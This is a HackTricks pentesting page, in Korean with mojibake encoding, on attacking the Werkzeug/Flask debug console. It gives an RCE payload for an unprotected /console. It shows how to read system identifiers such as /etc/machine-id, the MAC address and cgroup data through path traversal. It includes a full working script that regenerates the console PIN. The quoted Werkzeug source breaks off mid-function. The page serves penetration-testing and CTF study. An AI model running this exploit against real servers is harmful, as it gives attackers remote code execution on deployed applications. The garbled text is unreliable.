# Werkzeug / Flask ë””ë²„ê·¸

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.**

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤. ì´ëŠ” ì •ì°°ë¶€í„° ë³´ê³ ì„œ ì‘ì„±ê¹Œì§€ ì´ì–´ì§€ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë“¤ì´ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ ì—´ê³ , ì¦ê¸¸ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ê³µê²© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

## ì½˜ì†” RCE

ë””ë²„ê·¸ê°€ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´ `/console`ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

ì¸í„°ë„·ì—ëŠ” [ì´ê²ƒ](https://github.com/its-arun/Werkzeug-Debug-RCE)ê³¼ ê°™ì€ ì—¬ëŸ¬ ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤. ë˜í•œ metasploitì—ë„ í•˜ë‚˜ê°€ ìˆìŠµë‹ˆë‹¤.

## Pin Protected - Path Traversal

ì¼ë¶€ ê²½ìš°ì—ëŠ” **`/console`** ì—”ë“œí¬ì¸íŠ¸ê°€ í•€ìœ¼ë¡œ ë³´í˜¸ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **íŒŒì¼ ì´ë™ ì·¨ì•½ì **ì´ ìˆëŠ” ê²½ìš°, í•´ë‹¹ í•€ì„ ìƒì„±í•˜ëŠ” ë° í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Werkzeug Console PIN Exploit

ì•±ì—ì„œ ë””ë²„ê·¸ ì˜¤ë¥˜ í˜ì´ì§€ë¥¼ ê°•ì œë¡œ ë°œìƒì‹œì¼œ ì´ë¥¼ í™•ì¸í•˜ì„¸ìš”:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Werkzeugì˜ ë””ë²„ê·¸ ì¸í„°í˜ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  í•  ë•Œ "ì½˜ì†” ì ê¹€" ì‹œë‚˜ë¦¬ì˜¤ì— ëŒ€í•œ ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚˜ë©° ì½˜ì†”ì„ ì ê¸ˆ í•´ì œí•˜ë ¤ë©´ PINì´ í•„ìš”í•˜ë‹¤ëŠ” ê²ƒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. Werkzeugì˜ ë””ë²„ê·¸ ì´ˆê¸°í™” íŒŒì¼(`__init__.py`)ì—ì„œ PIN ìƒì„± ì•Œê³ ë¦¬ì¦˜ì„ ë¶„ì„í•˜ì—¬ ì½˜ì†” PINì„ ì•…ìš©í•˜ëŠ” ê²ƒì´ ì œì•ˆë©ë‹ˆë‹¤. PIN ìƒì„± ë©”ì»¤ë‹ˆì¦˜ì€ [**Werkzeug ì†ŒìŠ¤ ì½”ë“œ ì €ì¥ì†Œ**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆì§€ë§Œ ì ì¬ì ì¸ ë²„ì „ ë¶ˆì¼ì¹˜ë¡œ ì¸í•´ ì‹¤ì œ ì„œë²„ ì½”ë“œë¥¼ íŒŒì¼ íƒìƒ‰ ì·¨ì•½ì ì„ í†µí•´ í™•ë³´í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

ì½˜ì†” PINì„ ì•…ìš©í•˜ê¸° ìœ„í•´ `probably_public_bits`ì™€ `private_bits` ë‘ ì„¸íŠ¸ì˜ ë³€ìˆ˜ê°€ í•„ìš”í•©ë‹ˆë‹¤:

#### **`probably_public_bits`**

* **`username`**: Flask ì„¸ì…˜ì„ ì‹œì‘í•œ ì‚¬ìš©ìë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.
* **`modname`**: ì¼ë°˜ì ìœ¼ë¡œ `flask.app`ìœ¼ë¡œ ì§€ì •ë©ë‹ˆë‹¤.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: ì¼ë°˜ì ìœ¼ë¡œ **Flask**ë¡œ í•´ì„ë©ë‹ˆë‹¤.
* **`getattr(mod, '__file__', None)`**: Flask ë””ë ‰í† ë¦¬ ë‚´ì˜ `app.py`ì˜ ì „ì²´ ê²½ë¡œë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤(ì˜ˆ: `/usr/local/lib/python3.5/dist-packages/flask/app.py`). `app.py`ê°€ í•´ë‹¹ë˜ì§€ ì•ŠëŠ” ê²½ìš° **`app.pyc`ë¥¼ ì‹œë„**í•´ë³´ì„¸ìš”.

#### **`private_bits`**

* **`uuid.getnode()`**: í˜„ì¬ ê¸°ê¸°ì˜ MAC ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ë©° `str(uuid.getnode())`ë¥¼ ì‚¬ìš©í•˜ì—¬ 10ì§„ìˆ˜ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.
* **ì„œë²„ì˜ MAC ì£¼ì†Œë¥¼ ê²°ì •**í•˜ë ¤ë©´ ì•±ì—ì„œ ì‚¬ìš©í•˜ëŠ” í™œì„± ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì‹ë³„í•´ì•¼ í•©ë‹ˆë‹¤(ì˜ˆ: `ens3`). ë¶ˆí™•ì‹¤í•œ ê²½ìš° **`/proc/net/arp`ë¥¼ ë…¸ì¶œ**í•˜ì—¬ ì¥ì¹˜ IDë¥¼ ì°¾ì€ ë‹¤ìŒ **`/sys/class/net/<device id>/address`**ì—ì„œ MAC ì£¼ì†Œë¥¼ **ì¶”ì¶œ**í•©ë‹ˆë‹¤.
* 16ì§„ìˆ˜ MAC ì£¼ì†Œë¥¼ 10ì§„ìˆ˜ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

```python
# ì˜ˆì‹œ MAC ì£¼ì†Œ: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` ë˜ëŠ” `/proc/sys/kernel/random/boot_id`ì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ `/proc/self/cgroup`ì˜ ë§ˆì§€ë§‰ ìŠ¬ë˜ì‹œ(`/`) ì´í›„ ì²« ë²ˆì§¸ ì¤„ê³¼ ì—°ê²°í•©ë‹ˆë‹¤.
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

í•„ìš”í•œ ëª¨ë“  ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•œ í›„, ì•…ìš© ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ Werkzeug ì½˜ì†” PINì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ëŠ” ì¡°ë¦½ëœ `probably_public_bits`ì™€ `private_bits`ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ì‹œë¥¼ ìƒì„±í•˜ê³ , ì´í›„ ì¶”ê°€ ì²˜ë¦¬ë¥¼ ê±°ì³ ìµœì¢… PINì„ ìƒì„±í•©ë‹ˆë‹¤. ì•„ë˜ëŠ” ì´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” Python ì½”ë“œì…ë‹ˆë‹¤:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¹„íŠ¸ë¥¼ ì—°ê²°í•˜ì—¬ PINì„ ìƒì„±í•˜ê³  íŠ¹ì • ì†”íŠ¸(`cookiesalt` ë° `pinsalt`)ë¥¼ ì¶”ê°€í•˜ê³  ì¶œë ¥ì„ í˜•ì‹í™”í•˜ì—¬ í•´ì‹œí•©ë‹ˆë‹¤. Werkzeug ì½˜ì†”ì´ ì˜ˆìƒí•˜ëŠ” PINê³¼ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ëŒ€ìƒ ì‹œìŠ¤í…œì—ì„œ `probably_public_bits` ë° `private_bits`ì˜ ì‹¤ì œ ê°’ì´ ì •í™•íˆ íšë“ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

{% hint style="success" %}
Werkzeugì˜ **ì´ì „ ë²„ì „**ì„ ì‚¬ìš© ì¤‘ì´ë¼ë©´ **sha1 ëŒ€ì‹  md5 í•´ì‹± ì•Œê³ ë¦¬ì¦˜ìœ¼ë¡œ ë³€ê²½**í•´ ë³´ì„¸ìš”.
{% endhint %}

## ì°¸ê³  ìë£Œ

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ìœ¼ë¡œ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ê³ , íƒìƒ‰ë¶€í„° ë³´ê³ ì„œ ì‘ì„±ê¹Œì§€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ê·¸ë“¤ì´ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ ì—´ê³ , ì¦ê¸¸ ìˆ˜ ìˆë„ë¡ ì»¤ìŠ¤í…€ ë„êµ¬, íƒì§€ ë° ì´ìš© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ í•™ìŠµí•˜ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ì™€ í•¨ê»˜!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
